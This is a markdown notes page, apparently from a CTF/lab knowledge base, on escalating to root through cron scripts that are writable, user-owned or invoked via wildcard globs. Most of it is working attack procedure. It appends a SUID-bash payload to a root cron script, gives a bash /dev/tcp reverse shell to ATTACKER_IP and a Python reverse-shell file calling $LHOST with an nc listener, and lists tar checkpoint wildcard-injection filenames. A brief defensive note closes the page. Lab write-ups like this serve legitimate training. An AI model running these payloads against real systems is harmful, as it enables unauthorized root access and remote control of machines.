# Cron Script Abuse — Writable / User-Owned / Wildcard

Used on: **Team**, **bsidesgtdevelpy**

A script executed by root's crontab is somehow under attacker control: directly writable, owned by the attacker user, or invoked through a wildcard glob that pulls in attacker-supplied files. Whatever you can edit / drop in / spoof runs as root on the next cron tick.

## Prerequisites

- Membership in a group that has write access to a root-owned cron script
- The cron job runs frequently enough (= 1 min) to receive the shell quickly

## How It Works

```
root crontab ? /opt/admin_stuff/script.sh (every minute)
    ? calls /usr/local/bin/main_backup.sh
        ? main_backup.sh writable by `editors` group
            ? attacker in `editors` group
                ? append reverse shell payload ? root execution
```

## Steps

### 1. Identify group membership
```bash
id
# groups=...,1003(editors)
```

### 2. Find group-writable files
```bash
find / -group admin 2>/dev/null
find / -group editors 2>/dev/null
```

**Key file:** `/usr/local/bin/main_backup.sh`

### 3. Confirm the cron chain
```bash
cat /opt/admin_stuff/script.sh
# #I have set a cronjob to run this script every minute
# main_site="/usr/local/bin/main_backup.sh"
```

### 4. Append SUID bash payload
```bash
echo "cp /bin/bash /tmp/custom && chmod u+s /tmp/custom" >> /usr/local/bin/main_backup.sh
```

### 5. Wait up to one minute, then spawn root shell
```bash
/tmp/custom -p
whoami
# root
```

`-p` preserves the effective UID (required when bash detects SUID).

## Alternative — Reverse Shell Payload

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /usr/local/bin/main_backup.sh
```

## Variant — Root cron runs a user-owned script (bsidesgtdevelpy)

```bash
cat /etc/crontab
# *  *    * * *   root    cd /root/company && bash run.sh
# *  *    * * *   king    cd /home/king/   && bash run.sh
```

Looks fine — until you read `run.sh`:
```bash
cat /home/king/run.sh
# socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
```

`run.sh` lives in king's home and is **owned by king**, but `/etc/crontab` also schedules `root` to `cd /root/company && bash run.sh`. **You don't need to write the root-side cron script** — you just need to write the file the root-side script `python /root/company/media/*.py` glob pulls in:

```bash
cat /root/company/run.sh
# python /root/company/media/*.py     ? wildcard glob == attacker-controlled
```

So drop a `.py` into `/root/company/media/` (via a sibling write — bsidesgtdevelpy's foothold was a webapp upload that landed there), wait for the cron tick, get a root reverse shell.

```python
# attack.py — dropped into /root/company/media/
import socket,subprocess,os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$LHOST", 1337))
[os.dup2(s.fileno(), f) for f in (0, 1, 2)]
subprocess.call(["/bin/sh", "-i"])
```

```bash
# Listener
nc -lvnp 1337
# … wait one minute …
# whoami ? root
```

## Variant — Wildcard glob pulls in attacker files

Any cron line of the form `cd /some/dir && tar cf /backup *.txt` or `python /opt/scripts/*.py` is **wildcard injection**. If you can write to the glob target dir:

| Cron | Drop |
|------|------|
| `tar cf backup.tar *` | a file named `--checkpoint=1` and `--checkpoint-action=exec=sh -c 'id > /tmp/x'` |
| `python /opt/scripts/*.py` | a `.py` reverse shell |
| `bash /opt/scripts/*.sh` | a `.sh` reverse shell |
| `chown -R user *` | a symlink farm |

See <https://gtfobins.org/> for `tar`, `find`, `chown`, `chmod` wildcard-injection variants.

## How to Find It

```bash
cat /etc/crontab                                # [USED — Team, bsidesgtdevelpy]
ls -la /etc/cron.d/ /etc/cron.*                 # [USED — CCTV, Team]
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/* 2>/dev/null
systemctl list-timers --all                     # systemd equivalents

# Watch short-lived jobs you'd otherwise miss
# (drop pspy from your attacker box — see linux-enumeration.md)
./pspy64 -pf -i 1000

# Plain bash poll if pspy isn't an option
tail -f /var/log/syslog | grep -i cron          # [USED — bsidesgtdevelpy]
```

For every cron that runs as root, ask:
1. Who owns the script? Is it me?
2. Is the script writable by my user / a group I'm in?
3. Does the script call another script (`./run.sh`, `bash run.sh`)? Recurse the question.
4. Does the script use a wildcard glob over a dir I can write to?

## Defensive Note

Cron scripts run as root must be owned and writable only by root, **and any file they invoke must be likewise locked down**:
```bash
chmod 700 /usr/local/bin/main_backup.sh
chown root:root /usr/local/bin/main_backup.sh
```

Avoid wildcards in privileged cron lines. If you must, use absolute file lists or `find ... -exec`.

## Related
- [linux-enumeration.md](../enumeration/linux-enumeration.md) — where the cron sweep lives
- [python-input-injection.md](../web-rce/python-input-injection.md) — bsidesgtdevelpy's foothold that fed into this privesc


